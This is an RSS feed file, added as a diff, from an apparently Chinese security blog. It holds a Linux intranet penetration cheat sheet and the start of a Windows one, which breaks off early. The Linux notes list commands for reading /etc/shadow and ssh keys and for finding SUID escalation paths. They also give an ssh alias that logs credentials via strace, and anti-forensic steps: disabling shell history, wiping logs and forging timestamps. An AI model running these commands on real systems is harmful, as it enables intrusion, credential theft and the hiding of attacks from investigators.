@@ -1,0 +1,1355 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>Khala • Posts by &#34;痕迹清理&#34; tag</title>
+        <link>https://mobius-0.github.io</link>
+        <description>GLHF</description>
+        <language>zh-CN</language>
+        <pubDate>Mon, 28 Nov 2022 21:35:20 +0800</pubDate>
+        <lastBuildDate>Mon, 28 Nov 2022 21:35:20 +0800</lastBuildDate>
+        <category>Hexo</category>
+        <category>shoya</category>
+        <category>网站</category>
+        <category>网络安全</category>
+        <category>工具</category>
+        <category>虚拟机</category>
+        <category>星际争霸2</category>
+        <category>平衡</category>
+        <category>杂谈</category>
+        <category>小说</category>
+        <category>江南</category>
+        <category>龙族</category>
+        <category>动画</category>
+        <category>法律法规</category>
+        <category>域名</category>
+        <category>DNS</category>
+        <category>WEB</category>
+        <category>HTTP</category>
+        <category>计算机网络</category>
+        <category>IPSec</category>
+        <category>VPN</category>
+        <category>SSL</category>
+        <category>TLS</category>
+        <category>WiFi</category>
+        <category>邮件</category>
+        <category>网络协议</category>
+        <category>Linux</category>
+        <category>渗透</category>
+        <category>信息收集</category>
+        <category>痕迹清理</category>
+        <category>Windows</category>
+        <category>ASP</category>
+        <category>CSharp</category>
+        <category>Golang</category>
+        <category>Java</category>
+        <category>语言</category>
+        <category>反序列化</category>
+        <category>混淆</category>
+        <category>沙箱</category>
+        <category>类</category>
+        <category>JDK</category>
+        <category>JavaScript</category>
+        <category>PHP</category>
+        <category>PowerShell</category>
+        <category>Python</category>
+        <category>Ruby</category>
+        <category>Shell</category>
+        <category>漏洞</category>
+        <category>CSRF</category>
+        <category>服务器</category>
+        <category>SQL注入</category>
+        <category>SSRF</category>
+        <category>Cache</category>
+        <category>XSS</category>
+        <category>XXE</category>
+        <category>XML</category>
+        <category>Xpath</category>
+        <category>注入</category>
+        <category>函数</category>
+        <category>绕过</category>
+        <category>遍历</category>
+        <category>包含</category>
+        <category>文件</category>
+        <category>目录</category>
+        <category>读取</category>
+        <category>上传</category>
+        <category>中间件</category>
+        <category>IIS</category>
+        <category>Apache</category>
+        <category>Nginx</category>
+        <category>逻辑</category>
+        <category>策略配置</category>
+        <category>端口</category>
+        <category>社会工程学</category>
+        <category>搜索</category>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
+            <title>Linux内网渗透</title>
+            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
+            <category>Linux</category>
+            <category>渗透</category>
+            <category>信息收集</category>
+            <category>痕迹清理</category>
+            <pubDate>Mon, 28 Nov 2022 21:35:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
+&lt;h2 id=&#34;获取内核操作系统和设备信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取内核操作系统和设备信息&#34;&gt;#&lt;/a&gt; 获取内核，操作系统和设备信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;版本信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;uname -a&lt;/code&gt;  所有版本&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;uname -r&lt;/code&gt;  内核版本信息&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;uname -n&lt;/code&gt;  系统主机名字&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;uname -m&lt;/code&gt;  Linux 内核架构&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内核信息  &lt;code&gt;cat /proc/version&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;CPU 信息  &lt;code&gt;cat /proc/cpuinfo&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;发布信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cat /etc/*-release&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cat /etc/issue&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;主机名  &lt;code&gt;hostname&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件系统  &lt;code&gt;df -a&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;内核日志  &lt;code&gt;dmesg&lt;/code&gt;  /  &lt;code&gt;/var/log/dmesg&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;用户和组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户和组&#34;&gt;#&lt;/a&gt; 用户和组&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;列出系统所有用户  &lt;code&gt;cat /etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;列出系统所有组  &lt;code&gt;cat /etc/group&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;列出所有用户 hash（root） &lt;code&gt;cat /etc/shadow&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;查询用户的基本信息  &lt;code&gt;finger&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;当前登录的用户  &lt;code&gt;users&lt;/code&gt;   &lt;code&gt;who -a&lt;/code&gt;   &lt;code&gt;/var/log/utmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查询无密码用户  &lt;code&gt;grep &#39;x:0:&#39; /etc/passwd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;目前登录的用户  &lt;code&gt;w&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;登入过的用户信息  &lt;code&gt;last&lt;/code&gt;  /  &lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;显示系统中所有用户最近一次登录信息  &lt;code&gt;lastlog&lt;/code&gt;  /  &lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;登录成功日志  &lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;登录失败日志  &lt;code&gt;/var/log/faillog&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看特权用户  &lt;code&gt;grep :0 /etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看 passwd 最后修改时间  &lt;code&gt;ls -l /etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看是否存在空口令用户  &lt;code&gt;awk -F: &#39;length($2)==0 &amp;#123;print $1&amp;#125;&#39; /etc/shadow&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看远程登录的账号  &lt;code&gt;awk &#39;/\$1|\$6/&amp;#123;print $1&amp;#125;&#39; /etc/shadow&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查看具有 sudo 权限的用户&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;cat /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; | grep &amp;quot;ALL=(ALL)&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;用户和权限信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户和权限信息&#34;&gt;#&lt;/a&gt; 用户和权限信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;当前用户  &lt;code&gt;whoami&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;当前用户信息  &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;可以使用 sudo 提升到 root 的用户（root）  &lt;code&gt;cat /etc/sudoers&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;列出目前用户可执行与无法执行的指令  &lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;环境信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#环境信息&#34;&gt;#&lt;/a&gt; 环境信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;打印系统环境信息  &lt;code&gt;env&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;打印系统环境信息  &lt;code&gt;set&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;环境变量中的路径信息  &lt;code&gt;echo $PATH&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;打印历史命令  &lt;code&gt;history&lt;/code&gt;  /  &lt;code&gt;~/.bash_history&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;显示当前路径  &lt;code&gt;pwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;显示默认系统遍历  &lt;code&gt;cat /etc/profile&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;显示可用的 shell  &lt;code&gt;cat /etc/shells&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;进程信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程信息&#34;&gt;#&lt;/a&gt; 进程信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;查看进程信息  &lt;code&gt;ps aux&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;资源占有情况  &lt;code&gt;top -c&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看进程关联文件  &lt;code&gt;lsof -c $PID&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;完整命令行信息  &lt;code&gt;/proc/$PID/cmdline&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进程的命令名  &lt;code&gt;/proc/$PID/comm&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进程当前工作目录的符号链接  &lt;code&gt;/proc/$PID/cwd&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;运行程序的符号链接  &lt;code&gt;/proc/$PID/exe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进程的环境变量  &lt;code&gt;/proc/$PID/environ&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进程打开文件的情况  &lt;code&gt;/proc/$PID/fd&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;服务信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务信息&#34;&gt;#&lt;/a&gt; 服务信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;由 inetd 管理的服务列表  &lt;code&gt;cat /etc/inetd.conf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;由 xinetd 管理的服务列表  &lt;code&gt;cat /etc/xinetd.conf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;nfs 服务器的配置  &lt;code&gt;cat /etc/exports&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;邮件信息  &lt;code&gt;/var/log/mailog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;ssh 配置  &lt;code&gt;sshd_config&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;计划任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#计划任务&#34;&gt;#&lt;/a&gt; 计划任务&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;显示指定用户的计划作业（root）  &lt;code&gt;crontab -l -u %user%&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;计划任务
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/var/spool/cron/*&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/spool/anacron/*&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/crontab&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/anacrontab&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/cron.*&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/anacrontab&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;开机启动项
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/etc/rc.d/init.d/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;网络-路由和通信&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络-路由和通信&#34;&gt;#&lt;/a&gt; 网络、路由和通信&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;列出网络接口信息  &lt;code&gt;/sbin/ifconfig -a&lt;/code&gt;  /  &lt;code&gt;ip addr show&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;列出网络接口信息  &lt;code&gt;cat /etc/network/interfaces&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看系统 arp 表  &lt;code&gt;arp -a&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;打印路由信息  &lt;code&gt;route&lt;/code&gt;  /  &lt;code&gt;ip ro show&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看 dns 配置信息  &lt;code&gt;cat /etc/resolv.conf&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;打印本地端口开放信息  &lt;code&gt;netstat -an&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;列出 iptable 的配置规则  &lt;code&gt;iptables -L&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看端口服务映射  &lt;code&gt;cat /etc/services&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Hostname  &lt;code&gt;hostname -f&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看进程端口情况  &lt;code&gt;netstat -anltp | grep $PID&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;已安装程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#已安装程序&#34;&gt;#&lt;/a&gt; 已安装程序&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;rpm -qa --last&lt;/code&gt;  Redhat&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;yum list | grep installed&lt;/code&gt;  CentOS&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ls -l /etc/yum.repos.d/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dpkg -l&lt;/code&gt;  Debian&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cat /etc/apt/sources.list&lt;/code&gt;  Debian APT&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pkg_info&lt;/code&gt;  xBSD&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pkginfo&lt;/code&gt;  Solaris&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;pacman -Q&lt;/code&gt;  Arch Linux&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;emerge&lt;/code&gt;  Gentoo&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件&#34;&gt;#&lt;/a&gt; 文件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;最近五天的文件  &lt;code&gt;find / -ctime +1 -ctime -5&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;文件系统细节  &lt;code&gt;debugfs&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;公私钥信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#公私钥信息&#34;&gt;#&lt;/a&gt; 公私钥信息&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;~/.ssh&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/etc/ssh&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;日志&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#日志&#34;&gt;#&lt;/a&gt; 日志&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/var/log/boot.log&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/cron&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/faillog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/messages&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/run/utmp&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;虚拟环境检测&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#虚拟环境检测&#34;&gt;#&lt;/a&gt; 虚拟环境检测&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;vboxsf\|vboxguest&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;vmw_baloon\|vmxnet&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;xen-vbd\|xen-vnif&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;virtio_pci\|virtio_net&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;lsmod | grep -i &amp;quot;hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;容器内信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器内信息收集&#34;&gt;#&lt;/a&gt; 容器内信息收集&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;capsh --print&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;cat /proc/1/cgroup&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;env | grep KUBE&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ls -l .dockerenv&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ls -l /run/secrets/Kubernetes.io/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;mount&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ps aux&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;持久化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#持久化&#34;&gt;#&lt;/a&gt; 持久化&lt;/h1&gt;
+&lt;h2 id=&#34;权限提升&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限提升&#34;&gt;#&lt;/a&gt; 权限提升&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;内核漏洞利用&lt;/li&gt;
+&lt;li&gt;攻击有 root 权限的服务&lt;/li&gt;
+&lt;li&gt;利用第三方服务提权&lt;/li&gt;
+&lt;li&gt;通过有 SUID 属性的可执行文件
+&lt;ul&gt;
+&lt;li&gt;查找可能提权的可执行文件&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;find / -perm +4000 -ls&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;find / -user root -perm -4000 -exec ls -ldb &amp;#123;&amp;#125; \; 2&amp;gt;/dev/null&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;利用可用的 root 权限
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;利用误配置的 crontab 任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;自启动&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;/etc/init.d&lt;/li&gt;
+&lt;li&gt;/etc/rc.d/rc.local&lt;/li&gt;
+&lt;li&gt;~/.bashrc&lt;/li&gt;
+&lt;li&gt;~/.zshrc&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;后门&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后门&#34;&gt;#&lt;/a&gt; 后门&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;ssh 后门
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;alias ssh=&#39;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#39;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;后门账户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;常见应用
+&lt;ul&gt;
+&lt;li&gt;ICMP&lt;/li&gt;
+&lt;li&gt;DNS&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;icmp 后门&lt;/li&gt;
+&lt;li&gt;后门端口复用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.&lt;/code&gt;  开头隐藏文件&lt;/li&gt;
+&lt;li&gt;rootkit&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;痕迹清理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#痕迹清理&#34;&gt;#&lt;/a&gt; 痕迹清理&lt;/h1&gt;
+&lt;h2 id=&#34;历史命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#历史命令&#34;&gt;#&lt;/a&gt; 历史命令&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;kill -9 $$&lt;/code&gt;  kill history&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;history -c&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;在  &lt;code&gt;HISTSIZE=0&lt;/code&gt;  中设置  &lt;code&gt;HISTSIZE=0&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;清除修改日志文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#清除修改日志文件&#34;&gt;#&lt;/a&gt; 清除 / 修改日志文件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/var/log/btmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/lastlog&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/wtmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/utmp&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/secure&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/var/log/message&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;登录痕迹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登录痕迹&#34;&gt;#&lt;/a&gt; 登录痕迹&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;删除  &lt;code&gt;~/.ssh/known_hosts&lt;/code&gt;  中记录&lt;/li&gt;
+&lt;li&gt;修改文件时间戳
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;touch –r&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;删除 tmp 目录临时文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;操作痕迹&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#操作痕迹&#34;&gt;#&lt;/a&gt; 操作痕迹&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;vim 不记录历史命令  &lt;code&gt;:set history=0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;ssh 登录痕迹
+&lt;ul&gt;
+&lt;li&gt;无痕登录  &lt;code&gt;ssh -T user@host /bin/bash -i&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;覆写文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#覆写文件&#34;&gt;#&lt;/a&gt; 覆写文件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;shred&lt;/li&gt;
+&lt;li&gt;dd&lt;/li&gt;
+&lt;li&gt;wipe&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;难点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#难点&#34;&gt;#&lt;/a&gt; 难点&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征&lt;/li&gt;
+&lt;li&gt;即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录&lt;/li&gt;
+&lt;li&gt;留存的后门包含攻击者的信息&lt;/li&gt;
+&lt;li&gt;使用的代理或跳板可能会被反向入侵&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;在操作前检查是否有用户在线&lt;/li&gt;
+&lt;li&gt;删除文件使用磁盘覆写的功能删除&lt;/li&gt;
+&lt;li&gt;尽量和攻击前状态保持一致&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTJXdkZtRjFxUWpieC1CYVN0WGIxUQ==&#34;&gt;Linux 入侵痕迹清理技巧&lt;/span&gt;&lt;/li&gt;
+&lt;/ul&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</guid>
+            <title>Windows内网渗透</title>
+            <link>https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link>
+            <category>渗透</category>
+            <category>信息收集</category>
+            <category>痕迹清理</category>
+            <category>Windows</category>
+            <pubDate>Mon, 28 Nov 2022 11:20:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
+&lt;h2 id=&#34;基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基本命令&#34;&gt;#&lt;/a&gt; 基本命令&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;主机名  &lt;code&gt;hostname&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查询所有计算机名称  &lt;code&gt;dsquery computer&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;查看配置及补丁信息
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;systeminfo&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wmic qfe get description,installedOn /format:csv&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;查看版本  &lt;code&gt;ver&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;进程信息
+&lt;ul&gt;
